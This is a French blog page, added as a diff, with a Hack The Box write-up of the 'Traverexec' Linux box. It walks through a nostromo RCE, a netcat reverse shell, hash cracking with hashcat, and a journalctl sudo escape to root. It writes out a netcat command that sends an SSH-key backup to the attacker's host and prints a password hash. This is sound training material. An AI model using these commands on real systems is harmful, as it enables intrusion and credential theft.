@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="fr">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.78.2" />
+
+    
+    
+    
+
+<title>Traverexec - Easy • LOLOLEKIK</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Traverexec - Easy"/>
+<meta name="twitter:description" content="Résolution de la box Traverexec
+Introduction La box OpenAdmin de Hack The Box est une box Linux de difficulté &ldquo;Easy&rdquo;.
+Foothold Enumération Comme d&rsquo;habitude on commence avec un nmap.
+On voit via searchsploit que la version de nostromo est vulnérable à une RCE
+Exploit On récupère le script présent sur exploitdb https://www.exploit-db.com/exploits/47837 puis on l&rsquo;execute pour vérifier la vulnérabilité.
+Maintenant on va s&rsquo;envoyer un shell via netcat.
+Et on vérifie sur notre port en écoute si on l&rsquo;a bien reçu."/>
+
+<meta property="og:title" content="Traverexec - Easy" />
+<meta property="og:description" content="Résolution de la box Traverexec
+Introduction La box OpenAdmin de Hack The Box est une box Linux de difficulté &ldquo;Easy&rdquo;.
+Foothold Enumération Comme d&rsquo;habitude on commence avec un nmap.
+On voit via searchsploit que la version de nostromo est vulnérable à une RCE
+Exploit On récupère le script présent sur exploitdb https://www.exploit-db.com/exploits/47837 puis on l&rsquo;execute pour vérifier la vulnérabilité.
+Maintenant on va s&rsquo;envoyer un shell via netcat.
+Et on vérifie sur notre port en écoute si on l&rsquo;a bien reçu." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://lololekik.com/hack-the-box/traverxec/" />
+<meta property="og:site_name" content="OffSec &amp; CO" />
+
+
+    
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/qtcreator_dark.min.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/custom.css">
+
+
+
+
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="http://lololekik.com/">LOLOLEKIK</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         OffSec &amp; Co 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">LOLOLEKIK</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/cuisine/">
+						<span>Cuisine</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/exploit/">
+						<span>Exploit</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/network/">
+						<span>Network</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/writeups/">
+						<span>WriteUps</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/hack-the-box/">
+						<span>HackTheBox</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	
+	
+	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
+	
+	
+	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
+	
+	
+	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+</section>
+
+      </div>
+    </div>
+    
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>Traverexec - Easy</h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/hack-the-box">HACK THE BOX</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/pentest">pentest</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/linux">linux</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/easy">easy</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/gtfobins">gtfobins</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/ssh">ssh</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 2 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <p><strong>Résolution de la box Traverexec</strong></p>
+<h1 id="introduction">Introduction</h1>
+<p>La box <strong>OpenAdmin</strong> de Hack The Box est une box Linux de difficulté &ldquo;Easy&rdquo;.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_resume.png" alt="Résumé de la machine traverxec" class="imageformat"/>
+
+<h1 id="foothold">Foothold</h1>
+<h2 id="enumération">Enumération</h2>
+<p>Comme d&rsquo;habitude on commence avec un nmap.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_nmap.png" alt="scan de port nmap de la machine traverxec" class="imageformat"/>
+
+<p>On voit via <strong>searchsploit</strong> que la version de nostromo est vulnérable à une RCE</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_search.png" alt="searchsploit du service nostromo de la machine traverxec" class="imageformat"/>
+
+<h2 id="exploit">Exploit</h2>
+<p>On récupère le script présent sur exploitdb <a href="https://www.exploit-db.com/exploits/47837">https://www.exploit-db.com/exploits/47837</a> puis on l&rsquo;execute pour vérifier la vulnérabilité.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_cve.png" alt="Test de la cve nostromo de la machine traverxec" class="imageformat"/>
+
+<p>Maintenant on va s&rsquo;envoyer un shell via netcat.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_nc.png" alt="envoie de netcat de la machine traverxec" class="imageformat"/>
+
+<p>Et on vérifie sur notre port en écoute si on l&rsquo;a bien reçu.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_reve.png" alt="envoie de reverce shell de la machine traverxec" class="imageformat"/>
+
+<h1 id="user">User</h1>
+<h2 id="enumération-1">Enumération</h2>
+<p>On commence par regarder les différents users présents sur la machine.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_passwd.png" alt="enum user la machine traverxec" class="imageformat"/>
+
+<p>Ici on voit un utilisateur David. Ca va être notre cible. En regardant les droits de son dossier <strong>Home</strong> on voit que l&rsquo;on a les droits d&rsquo;execution dessus. On voit donc qu&rsquo;on peut se déplacer à l&rsquo;intérieur.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_home.png" alt="enum droit home user la machine traverxec" class="imageformat"/>
+
+<p>On récupere aussi <strong>linPEAS.sh</strong> sur la machine pour énumérer.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_wget.png" alt="enum  la machine traverxec" class="imageformat"/>
+
+<p>On trouve des répertoires interessants et un mot de passe dans les répertoires se référant à notre service <em>nostromo</em>.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_find_lin.png" alt="enum nostromo la machine traverxec" class="imageformat"/>
+
+<p>En regardant le hash présent dans le .htpasswd on voit qu&rsquo;il est de type md5.</p>
+<p><code>david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/</code></p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_hash.png" alt="enum nostromo la machine traverxec" class="imageformat"/>
+
+<p>Maintenant que nous connaissons le type du hash nous pouvons utiliser hashcat pour essayer de trouver le mot de passe.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hashcat -m <span style="color:#ae81ff">500</span> hash /usr/share/wordlists/rockyou.txt  
+</code></pre></div><p>Hashcat arrive à nous fournir un mot de passe.</p>
+<p>En continuant d&rsquo;énumérer on trouve dans le fichier nhttpd les lignes suivantes.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_conf.png" alt="enum nostromo la machine traverxec" class="imageformat"/>
+
+<h2 id="exploit-1">Exploit</h2>
+<p>On avait relevé tout à l&rsquo;heure que l&rsquo;on avait le droit d&rsquo;execution sur le dossier <strong>Home</strong> de David.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_david.png" alt="cd david nostromo la machine traverxec" class="imageformat"/>
+
+<p>On trouve dans le dossier <strong>Protected-file-area</strong> un backup des clés ssh. Via netcat, on envoie le fichier en ouvrant un port sur notre machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 10.10.14.10 <span style="color:#ae81ff">1234</span> &lt; /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
+</code></pre></div>
+
+
+  <img src="/img/htb/traverxec/traverxec_send.png" alt="send backup de la machine traverxec" class="imageformat"/>
+
+<p>Et on le récupère avec cette commande</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -nlvp <span style="color:#ae81ff">1234</span> &gt; backup-ssh.tgz
+</code></pre></div>
+
+
+  <img src="/img/htb/traverxec/traverxec_rec.png" alt="recieve backup de la machine traverxec" class="imageformat"/>
+
+<p>Ici il était aussi possible de se connecter directement sur le site web avec le mot de passe trouvé avec hashcat. Maintenant, on extrait l&rsquo;archive.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_arch.png" alt="extract backup de la machine traverxec" class="imageformat"/>
+
+<p>On crack ensuite la clé privée rsa grace à <strong>ssh2john</strong> pour trouver la <em>passphrase</em></p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_ssh2.png" alt="crack rsa de la machine traverxec" class="imageformat"/>
+
+<p>On peut maintenant se connecter en ssh avec l&rsquo;utilisateur David</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_ssh.png" alt="connect ssh david de la machine traverxec" class="imageformat"/>
+
+<h1 id="root">Root</h1>
+<h2 id="enumération-2">Enumération</h2>
+<p>On peut voir qu&rsquo;il y a un dossier bin dans le répertoire personnel de <em>David</em> avec les fichiers suivants.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_script.png" alt="enum root de la machine traverxec" class="imageformat"/>
+
+<h2 id="exploit-2">Exploit</h2>
+<p>On voit que journalctl est exécuté en tant que sudo. En regardant dans les gtfobins on peut voir qu&rsquo;il est possible d&rsquo;obtenir un shell root. Pour cela il suffit d&rsquo;ajouter <code>!/bin/bash</code> lorsque le fichier sera lu avec <em>less</em>.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_fail.png" alt="exploit impossible de la machine traverxec" class="imageformat"/>
+
+<p>Cependant ici on voit que <em>less</em> n&rsquo;intervient pas. C&rsquo;est parce que la taille de notre terminal est trop longue.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_rezise.png" alt="rezise term de la machine traverxec" class="imageformat"/>
+
+<p>Maintenant on peut lancer notre exploit.</p>
+
+
+
+  <img src="/img/htb/traverxec/traverxec_win.png" alt="rezise term de la machine traverxec" class="imageformat"/>
+
+
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    
+    <a href="/hack-the-box/traceback/" class="navigation-next">
+      <span class="navigation-tittle">Traceback - Easy</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
+
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+        
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+    
+
+
+
+    </body>
+</html>
